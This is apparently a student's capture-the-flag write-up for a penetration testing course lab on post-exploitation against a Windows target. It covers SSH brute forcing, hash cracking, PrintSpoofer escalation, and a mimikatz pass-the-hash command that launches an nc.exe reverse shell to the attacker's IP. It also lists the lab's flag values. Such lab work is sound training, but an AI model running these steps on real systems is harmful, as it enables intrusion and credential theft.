---
tags:
  - "#lab"
  - "#ctf"
  - red_team
  - post_exploit
course: "[[_Hub - Penetration Testing Student]]"
module: Host and Networking Penetration Test
topic: Post Exploitation
date: 2025-11-15
status: completed
---
# Objective

A target machine is accessible at **target.ine.local.** Identify the services and capure the flags.

- **Flag 1:** An insecure ssh user named **alice** lurks in the system.
- **Flag 2:** Using the hashdump file discovered in the previous challenge, can you crack the hashes and compromise a user?
- **Flag 3:** Can you escalate privileges and read the flag in C://Windows//System32//config directory?
- **Flag 4:** Looks like the flag present in the Administrator's home denies direct access.

The following will be useful:

- **Wordist:** /usr/share/wordlists/metasploit/unix_passwords.txt
- **Tool:** /root/Desktop/PrintSpoofer.exe

# Walkthrough

- Ran `ifconfig` and `ping -c 1 target.ine.local` commands to identify the network information of the attack machine and the victim machine. Confirmed:
	- The IP addresses of both the machines
	- The target machine is online and pingable
	- The machines are not in the same subnet

    <img width="946" height="425" alt="5-6  Post Exploitation CTF 1 ifconfig" src="https://github.com/user-attachments/assets/b8084b69-7d43-4791-83d7-58a985e9c7c1" />
    <img width="747" height="206" alt="5-7  Post Exploitation CTF 2 ping" src="https://github.com/user-attachments/assets/88f7e3d3-1e6d-444b-8802-0f74e9e7364e" />

- Conduct an nmap scan against the target

  <img width="1047" height="754" alt="5-7  Post Exploitation CTF 2 nmap" src="https://github.com/user-attachments/assets/57e788e1-dcdc-4f84-9de8-40d4b6c332f4" />

- Use `hydra` to conduct a brute force attack against the account `alice` and find it's password

  <img width="1498" height="283" alt="5-7  Post Exploitation CTF 2 alice" src="https://github.com/user-attachments/assets/45b2adec-a6f4-45c8-a85a-e5de15f30cde" />

- ssh to the target host and get the flag 1

  <img width="870" height="658" alt="5-7  Post Exploitation CTF 2 flag 1" src="https://github.com/user-attachments/assets/a63889a9-2559-4319-9071-28a1a8551919" />

- Download the `hashdump.txt` content to local attack machine and crack hashes with `john`

  <img width="995" height="348" alt="5-7  Post Exploitation CTF 2 john" src="https://github.com/user-attachments/assets/195b7391-f691-419b-a19a-fde9d82dbc91" />

- ssh to the target machine with david's account and get the flag 2

  <img width="821" height="678" alt="5-7  Post Exploitation CTF 2 flag 2" src="https://github.com/user-attachments/assets/6c8ca10f-1b5d-4693-b8fb-15f2c72fad95" />

- Upload `PrintSpoofer64.exe` to the target machine

  <img width="1266" height="224" alt="5-7  Post Exploitation CTF 2 webserver" src="https://github.com/user-attachments/assets/b87e38f9-eb9a-40b0-ad04-7d22c1e48225" />
  <img width="1084" height="443" alt="5-7  Post Exploitation CTF 2 download" src="https://github.com/user-attachments/assets/8e5d9ea0-76a0-46e8-8ac8-67d3f987abd5" />
  <img width="1215" height="481" alt="5-7  Post Exploitation CTF 2 tool" src="https://github.com/user-attachments/assets/088ed9db-0cc3-4076-aca9-326c83b89cf1" />

- Escalate privilege with the tool

  <img width="550" height="97" alt="5-7  Post Exploitation CTF 2 execution" src="https://github.com/user-attachments/assets/fffc0cb1-bee1-4d18-9a8b-dcfef44c9fca" />
  <img width="629" height="132" alt="5-7  Post Exploitation CTF 2 escalation" src="https://github.com/user-attachments/assets/b17776e3-1d4e-4074-8fa2-5dc75dfed963" />

- Get the flag 3

  <img width="593" height="714" alt="5-7  Post Exploitation CTF 2 flag 3" src="https://github.com/user-attachments/assets/d9795611-a3d2-451e-95b9-569cec4f1efc" />

- Upload `mimikatz.exe` to the target host

  <img width="928" height="358" alt="5-7  Post Exploitation CTF 2 web sever 2" src="https://github.com/user-attachments/assets/52834498-8bfd-4f10-8d89-e3789884fdd9" />
  <img width="913" height="416" alt="5-7  Post Exploitation CTF 2 download 2" src="https://github.com/user-attachments/assets/122b58c6-c1b3-4b1f-875b-318afe95f06c" />

- Use `mimikatz` dump the hash of administrator, dc72e068b40b8353b7c0c095bbeef7fa

  <img width="804" height="501" alt="5-7  Post Exploitation CTF 2 dump" src="https://github.com/user-attachments/assets/0e62683d-8884-41dd-a963-9bd3c0ee776b" />

- Download `nc.exe` to the target machine

  <img width="883" height="394" alt="5-7  Post Exploitation CTF 2 nc" src="https://github.com/user-attachments/assets/a5bf6737-144a-42e8-98a1-c4660227a0e2" />

- Set a listener in the attack machine

  
- Back to `mimikatz` and run the command `sekurlsa::pth /user:Administrator /domain:WIN-GQ7PTVECHL /ntlm:dc72e068b40b8353b7c0c095bbeef7fa /run:"C:\TEMP\nc.exe 10.10.38.2 1234 -e cmd.exe"`, then we get a shell

  <img width="778" height="242" alt="5-7  Post Exploitation CTF 2 shell" src="https://github.com/user-attachments/assets/949cd509-4da5-4c68-b428-3cae4ec7b791" />

- As the shell is still established with SYSTEM, so we change our strategy.  Use `smb/psexec` to access the target machine

  <img width="1193" height="378" alt="5-7  Post Exploitation CTF 2 smb access" src="https://github.com/user-attachments/assets/8730a92b-f5f2-46bb-9ae2-ddae759298f2" />

  > Note the `aad3b435b51404eeaad3b435b51404ee` part means that NT hash is null

- We can also change `C:\Users\Administrator\flag` permissions with SYSTEM account alternatively. Take over the owner of it and grand full access to the account SYSTEM

  <img width="1095" height="334" alt="5-7  Post Exploitation CTF 2 owner" src="https://github.com/user-attachments/assets/effe499f-f5c3-4552-a406-fd0bf69eae92" />

- View its permission setting and find the SYSTEM has a deny rule. Remove it and access the diretory's content. Get the flag 4.

  <img width="752" height="666" alt="5-7  Post Exploitation CTF 2 flag 4" src="https://github.com/user-attachments/assets/9a10fea7-b9fe-41f7-84c9-fc6547b656ab" />

# Key Finds

- FLAG 1: c35fa7761d4549579ea26b943babc04b
- FLAG 2: 6b50d3b976ec409db3d8c8456caadca7
- FLAG 3: d4c5f540d87849ce918a0aa0e203916c
- FLAG 4: 09bfaeca08a947688c9747d6a11072b2
